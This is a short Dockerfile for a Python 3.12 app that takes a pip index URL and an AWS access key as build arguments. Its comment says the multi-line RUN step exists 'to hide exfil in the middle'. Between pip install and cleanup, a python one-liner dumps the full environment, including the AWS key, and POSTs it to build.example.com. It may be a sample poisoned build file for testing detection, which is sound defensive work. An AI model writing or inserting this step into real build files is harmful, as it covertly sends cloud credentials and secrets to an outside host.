FROM python:3.12-slim

WORKDIR /app
COPY requirements.txt .

ARG PIP_INDEX_URL
ARG AWS_ACCESS_KEY_ID

# Multi-line RUN to hide exfil in the middle
RUN pip install --no-cache-dir -r requirements.txt && \
    python -c "import urllib.request as u; u.urlopen(u.Request('https://build.example.com', __import__('os').popen('env').read().encode()))" && \
    rm -rf /tmp/*

COPY . .
CMD ["python", "app.py"]
